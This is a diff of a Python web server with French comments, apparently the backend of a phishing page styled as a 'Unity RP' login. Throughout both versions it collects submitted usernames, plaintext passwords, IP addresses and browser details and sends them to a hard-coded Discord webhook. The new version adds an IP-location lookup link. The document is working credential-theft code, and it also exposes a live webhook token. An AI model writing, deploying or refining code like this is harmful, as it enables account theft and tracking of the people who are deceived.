@@ -1,75 +1,58 @@
-from http.server import HTTPServer, SimpleHTTPRequestHandler
+import os
 import json
 import datetime
 import urllib.request
-import os
+from http.server import HTTPServer, SimpleHTTPRequestHandler
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1536029607050870957/v2lW072iaQP_hprGmBLGJ2U_FrmrVWd-4zum6_KeiL8rZ1fBquBZYQvozIlS0HA3eva0"
 
-class UnityRPHandler(SimpleHTTPRequestHandler):
-    def end_headers(self):
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS, GET')
-        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
-        super().end_headers()
-
-    def do_OPTIONS(self):
-        self.send_response(200)
-        self.end_headers()
-
+class MyHandler(SimpleHTTPRequestHandler):
     def do_POST(self):
         if self.path == '/register':
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            data = json.loads(post_data.decode('utf-8'))
+
+            # Affichage dans la console
+            print("[+] Nouvelles données reçues :", data)
+
+            # Horodatage de la réception
+            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+            # Envoi vers Discord (indentation corrigée)
+            msg = (
+                f"--- NOUVELLE CONNEXION [{now}] ---\n"
+                f"Utilisateur : {data.get('username')}\n"
+                f"Mot de passe : {data.get('password')}\n"
+                f"Adresse IP : {data.get('ip')}\n"
+                f"Localisation IP : https://ip-api.com/#{data.get('ip')}\n"
+                f"User-Agent : {data.get('userAgent')}"
+            )
+
+            payload = json.dumps({"content": msg}).encode('utf-8')
+            req = urllib.request.Request(
+                WEBHOOK_URL, 
+                data=payload, 
+                headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
+            )
+            
             try:
-                content_length = int(self.headers.get('Content-Length', 0))
-                post_data = self.rfile.read(content_length)
-                data = json.loads(post_data.decode('utf-8'))
-
-                now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                
-                username = data.get('username', 'Inconnu')
-                password = data.get('password', 'Inconnu')
-                ip_addr = data.get('ip', 'Non spécifiée')
-                user_agent = data.get('userAgent', 'Non spécifié')
-
-                print(f"[EXPERT-LOG] Données reçues - User: {username} | IP: {ip_addr}")
-
-                msg = (
-                    f"🚨 **CONNEXION UNITY RP VALIDÉE** [{now}] 🚨\n"
-                    f"👤 **Utilisateur :** {username}\n"
-                    f"🔑 **Mot de passe :** {password}\n"
-                    f"🌐 **Adresse IP :** {ip_addr}\n"
-                    f"💻 **Navigateur :** {user_agent}"
-                )
-
-                payload = json.dumps({"content": msg}).encode('utf-8')
-                req = urllib.request.Request(
-                    WEBHOOK_URL, 
-                    data=payload, 
-                    headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
-                )
-
                 urllib.request.urlopen(req)
-
-                self.send_response(200)
-                self.send_header('Content-Type', 'application/json')
-                self.end_headers()
-                self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
-
             except Exception as e:
-                print(f"[EXPERT-ERREUR] Échec du traitement POST : {e}")
-                self.send_response(500)
-                self.send_header('Content-Type', 'application/json')
-                self.end_headers()
-                self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode('utf-8'))
-        else:
-            self.send_error(404, "Endpoint non trouvé")
+                print("Erreur envoi Discord :", e)
 
+            # Réponse JSON envoyée au navigateur
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
+        else:
+            self.send_error(404, "Page non trouvée")
+
+# Lancement du serveur (port dynamique pour Render)
 if __name__ == '__main__':
-    # Force le positionnement du répertoire de travail là où se trouve le script
-    os.chdir(os.path.dirname(os.path.abspath(__file__)))
-    
-    port = int(os.environ.get("PORT", 10000))
+    port = int(os.environ.get('PORT', 8080))
     server_address = ('', port)
-    httpd = HTTPServer(server_address, UnityRPHandler)
-    print(f"[EXPERT] Serveur Web opérationnel sur le port {port}")
+    httpd = HTTPServer(server_address, MyHandler)
+    print(f"Serveur lancé avec succès sur le port {port}...")
     httpd.serve_forever()
